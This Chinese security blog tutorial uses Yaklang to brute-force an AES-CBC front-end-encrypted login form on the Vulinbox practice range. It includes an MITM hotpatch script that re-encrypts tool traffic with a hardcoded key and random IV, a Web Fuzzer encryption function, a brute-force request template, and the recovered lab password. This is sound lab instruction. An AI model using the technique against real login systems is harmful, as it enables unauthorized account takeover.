---
title: 加密随机 IV 如何热加载重写加密照常爆破
url: https://mp.weixin.qq.com/s/LXkdMnh22EGWIKhzpBQbkw
source: Doonsec's feed
date: 2026-11-24
fetch_date: 2026-11-25T10:43:52.224324
---

# 加密随机 IV 如何热加载重写加密照常爆破

# 加密随机 IV 如何热加载重写加密照常爆破

原创

挽风
挽风

挽风安全

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

TUTORIAL · 前端加密实战　·　2026.11

前端加密＝爆破无门？

随机 IV 又如何热加载

重写加密照常爆破

Yaklang · MITM Hotpatch · Web Fuzzer

挽风安全 · 实战教程

YAKLANGAES-CBC

📚 本文目录 · 4 PARTS + 结语

01
定位前端加密点　·　断点锁定加密逻辑

02
CBC 与 ECB 的关键差异　·　随机 IV 差异

03
MITM 热加载脚本　·　网关层重写加密

04
Web Fuzzer 实战爆破　·　装字典拿口令

///
写在最后　·　全链路回顾

本文基于 Yaklang 官方的 Web Fuzzer 热加载示例，目标场景是 Vulinbox 靶场的 CryptoJS.AES(CBC) 前端加密登录表单——登录口令由前端 JS 加密后才提交，常规明文爆破工具无法直接使用。

官方 Wp：https://yaklang.com/products/legacy/Web%20Fuzzer/fuzz-hotpatch-example2/。全文围绕这一关展开：定位加密点 → 分析 CBC 特性 → 热加载重写加密 → Web Fuzzer 爆破。

01

PART

定位前端加密点

LOCATE THE HOOK

先看一眼目标场景，一个再普通不过的登录页，差别在于提交前多了前端加密：

![](https://mmbiz.qpic.cn/mmbiz_png/RjLLs2thZRGOeahWtjiap45vs1J8QnPymsLYKCjYHdndfGT1FZibHtiamo34iaZxnuuFUgzYs1qdYicpQiahT3I5hBibvJDWcHGv29gxEC5YB9twtY/640?wx_fmt=png&from=appmsg)

拿到场景后不着急发包，先定位到加密逻辑点：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjLLs2thZRGS9Biaf3sSW9Xtg7icvdBNhqmFA6EVaplzK5MDOicC5SeXHU80gELg4re1sWQMzbasib9Ry1YEicB4J6gvMKSBv07QHu03VFElbrzs/640?wx_fmt=png&from=appmsg)

STEP 01

#### 登录断点，锁定加密点

登录然后断点，可以看到加密点在 fetch 前，submit 的数据有 data、key、iv 三个值：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjLLs2thZREzCMkfwWO8QDWp22hOnmS1g893icKTiaM7sdXyy3MvKqFXI9Mr9RF45Af064j6t5BHl7bEhnZ09FKtEzUjS3BE381PKDsibZ7UZM/640?wx_fmt=png&from=appmsg)

默认使用 CryptoJS.AES(CBC 需要 IV).encrypt/decrypt，默认 PKCS7Padding，密钥长度不足 16 字节以 NULL 补充，超过 16 字节截断。注意：这种加密方式每一次密文可能都不一样。

02

PART

CBC 与 ECB 的关键差异

CBC VS ECB

本关与 ECB 关的核心差异只有一个：**CBC 模式引入了随机 IV**。考点有三个：

1

理解 CBC 与 ECB 的区别（链式加密、IV 的作用）；

2

掌握「IV 随密文传输」模式下攻击者的自由度——IV 不需要保密，服务端从请求字段取 IV 解密，攻击者可以自己生成 IV；

3

用 MITM 热加载在网关层重写加密逻辑，绕过前端限制，完成爆破。

![](https://mmbiz.qpic.cn/mmbiz_png/RjLLs2thZRGnlvDNx2GwLZua8JlXXWhQb1iaxrZJbTEUvjfnJExtv8FXYHFtqq62NiaWBw4MZIu1730zKnbrKvyicggVNNicSvZvb2cibpWsEkfA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjLLs2thZRH8hk6GY4rLR1ZMKhNje593xbu8EaksKB9PUBbpwPlnJkURvx8IRhYsGvOGHeB61JXKkuIAfLicrJ04rjnv1qR4Jv6HW3KkmOick/640?wx_fmt=png&from=appmsg)

一个容易踩的编码细节：key.toString() 在 CryptoJS 中输出的是 Hex 编码，所以请求里的 key 是 313233... 而非明文 1234...，IV 同理。这意味着构造请求时，key 和 iv 都要走 hex 编解码，而 data 是 Base64。

官方解释如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjLLs2thZRE1rHvG4PRyBNINHyz6leYEUkribO3ibKCtTaUD0DQvlySA0ksXnPxj6qf2wp1iclB9rfdPTvBVznaLp4BMpLJFuOP8rDvVETQBpQ/640?wx_fmt=png&from=appmsg)

AES 每次只能加密 16 字节一块，CBC 与 ECB 的本质区别在块间处理：

...text

1、ECB：Ci = E(K, Pi)             ← 各块独立加密

2、CBC：Ci = E(K, Pi ⊕ C(i-1))    ← 每块先与上一块密文异或再加密

　　　C0 = IV                       ← 第一块与随机 IV 异或打底

这带来两个直接后果：

**相同明文每次密文不同**（随机 IV 打底）——即页面提示「每一次密文可能都不一样」，同时杜绝了 ECB 的模式泄露问题；

**IV 随密文传输**是 CBC 的标准做法，服务端解密时从请求中取 IV。IV 不需要保密，只需要不可预测——这就给了中间人操作空间：我们自己生成 IV、自己加密，服务端照单全收。

03

PART

MITM 热加载脚本

HOTPATCH SCRIPT

STEP 02

#### 网关层部署热加载

于是使用 MITM 热加载脚本，在代理层把加密逻辑接管过来：

...yak

# ============================================================

# Vulinbox: CryptoJS.AES(CBC) 前端加密登录表单

# ============================================================

HEX\_KEY = "31323334313233343132333431323334"

TARGET\_PATH = "crypto/js/lib/aes/cbc/handler"

# ---- 生成随机 IV (每次请求全新, hex 形式随包传输) ----

randIV = () => {

　　ivBytes = codec.RandBytes(16)

　　return {"bytes": ivBytes, "hex": codec.EncodeToHex(ivBytes)}

}

# ---- 加密: 仅对明文 body 加密; 已是密文结构则原样放行 ----

encryptData = (packet) => {

　　body = string(poc.GetHTTPPacketBody(packet))

　　// 已加密流量(浏览器JS产物): 直接放行, 避免双重加密

　　params = json.loads(body)

　　if params != nil && "data" in params && "key" in params && "iv" in params {

　　　　return string(packet)

　　}

　　// 明文流量(sqlmap/Fuzzer): 加密后转发

　　key = codec.DecodeHex(HEX\_KEY)~

　　iv = randIV()

　　enc = codec.AESCBCEncrypt(key, body, iv.bytes)~

　　b64 = codec.EncodeBase64(enc)

　　newBody = f`{"data": "${b64}", "key": "${HEX\_KEY}", "iv": "${iv.hex}"}`

　　return string(poc.ReplaceBody(packet, newBody, false))

}

# ---- 核心 Hook: 修改真正发往服务器的流量 ----

hijackHTTPRequest = func(isHttps, url, req, forward, drop) {

　　if str.Contains(string(req), TARGET\_PATH) {

　　　　forward(encryptData(req))

　　} else {

　　　　forward(req)

　　}

}

# ---- 可选: 历史记录自动解密存明文(只影响展示, 不影响发送) ----

hijackSaveHTTPFlow = func(flow, modify, drop) {

　　request = codec.StrconvUnquote(flow.Request)~

　　if str.Contains(string(request), TARGET\_PATH) {

　　　　params = json.loads(string(poc.GetHTTPPacketBody(request)))~

　　　　if params != nil && "data" in params && "key" in params && "iv" in params {

　　　　　　raw = codec.DecodeBase64(params.data)~

　　　　　　key = codec.DecodeHex(params.key)~

　　　　　　iv = codec.DecodeHex(params.iv)~

　　　　　　plain = string(codec.AESCBCDecrypt(key, raw, iv)~)

　　　　　　request = string(poc.ReplaceBody(request, plain, false))

　　　　　　flow.Request = codec.StrconvQuote(request)

　　　　}

　　}

　　modify(flow)

}

![](https://mmbiz.qpic.cn/mmbiz_png/RjLLs2thZRG1EsABAt8J7InDia3v8kdRXSvWbwXtKHQIH7RibTfcXz5SgoicMMfdSPHgkUbibbaCxd28lvr1pFibEddK4th8nngezyAdwgvhNyp8/640?wx_fmt=png&from=appmsg)

这是 MITM 记录的原始流量快照——从 Web Fuzzer 发出来的就是明文。hijackHTTPRequest 是在「拦下之后、转发之前」这个环节修改流量的，MITM 列表存档的是你交进来的原包，不是改完后的包。所以列表里永远看到明文，这是热加载的工作机制决定的。

响应包内也可以看到原始的加密数据：

...response

origin\_data: dyhJpPUc9eZu3aKdbaRQNVkjagXcM73AJ8WwmtOHKS3jJRYcXr5SL5osivDzhQB

这是服务端收到的原始密文回显——如果钩子没加密，服务端收到的 origin\_data 应该就是明文 JSON 本身。现在它是一串 Base64，说明服务器收到的确实是加密包，钩子在工作。

服务端把钩子加密的密文解开，还原出了你的明文账户密码——端到端链路完整闭环：明文进钩子 → 加密 → 服务端解密成功。

因为 forward(encryptData(req)) 传给服务器的是加密副本，而 MITM 存档记录的是 hijackHTTPRequest 被调用那一刻的原始入参。修改发生在存档之后、转发之前——这就是「为什么列表明文但服务端收到密文」的机制根源。

热加载的本质是在代理层实现了一个可编程的中间人：**hijackHTTPRequest** 提供拦截入口，**encryptData** 实现协议重写，**forward()** 控制真正发出的流量。浏览器加密流量放行、工具明文流量代加密的双分支设计，让 sqlmap、Fuzzer 等不支持前端加密的工具透明地与加密接口通信。

04

PART

Web Fuzzer 实战爆破

BRUTE FORCE

STEP 03

#### 写入加密函数

进入 Web Fuzzer 页面爆破口令，先写入热加载加密函数：

...yak

encryptCBCPassword = func(plainPassword) {

　　key = codec.DecodeHex("31323334313233343132333431323334")~

　　ivBytes = codec.RandBytes(16)

　　hexIV = codec.EncodeToHex(ivBytes)

　　plain = f`{"username": "admin", "password": "${plainPassword}"}`

　　enc = codec.AESCBCEncrypt(key, plain, ivBytes)~

　　return f`{"data": "${codec.EncodeBase64(enc)}", "key": "31323334313233343132333431323334", "iv": "${hexIV}"}`

}

STEP 04

#### 配置 Payload，装字典开爆

Payload 设置如下，用 {{yak(...)}} 表达式把密码占位符交给加密函数处理：

...http

POST /crypto/js/lib/aes/cbc/handler HTTP/1.1

Host: 192.168.0.7:8787

Referer: http://192.168.0.7:8787/crypto/js/lib/aes/cbc

Accept-Encoding: gzip, deflate

Origin: http://192.168.0.7:8787

Accept-Language: zh-CN,zh;q=0.9

Accept: \*/\*

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36

Content-Type: application/json

Content-Length: 39

{{yak(encryptCBCPassword|{{payload(password)}})}}

随后把 {{payload(password)}} 字典右键添加字典，然后进行爆破：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjLLs2thZRH7SG0D19WicuehTE6jmic9cURBFl7xBicFFcg4iaJTKlkgPX4ygtoqossz9mXheFxY2Y6Qzz1ia3aLibhqJ0MZwJ9B9NQnS8f5Q0nMA/640?wx_fmt=png&from=appmsg)

admin / admin123

成功拿到口令，完成此 AES-CBC 前端加密的登录爆破场景

///

LAST

写在最后

RECAP

整条链路回顾下来并不复杂：先定位前端加密点，确认 CBC 模式下 IV 随请求传输、攻击者可以自己生成；再用 MITM 热加载在网关层重写加密逻辑，让 sqlmap、Fuzzer 这类不支持前端加密的工具也能与加密接口通信；最后在 Web Fuzzer 中装载字典完成爆破。

遇到前端加密不必绕道走，定位加密逻辑，代理层就是跳板。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/RjLLs2thZRFGMSXsIWMeNL0UFcxBNW3btV4RSFCdLIOsAQJvcIHJXf42lQyvOxw4xdD4QLiaW1RpxaqYcb72iaGMTNPqwPCkibzAXFW1r4N2jM/640?wx_fmt=png&from=appmsg)

既然看到这里了，如果觉得有用，随手点个赞、在看、转发三连吧。

点赞

在看

转发

THANKS FOR READING

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/RjLLs2thZRELictgwfIyFYpuDcde3CzeJTkGZjXk1HdLyaGPstCGyczXU5yYZnb5ckUaia1y1OuaFVhjIdbH1yTe5iaG3kJzyWM9w2XHJqL2eU/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
推荐
，轻点两下取消推荐
分享
留言
收藏
听过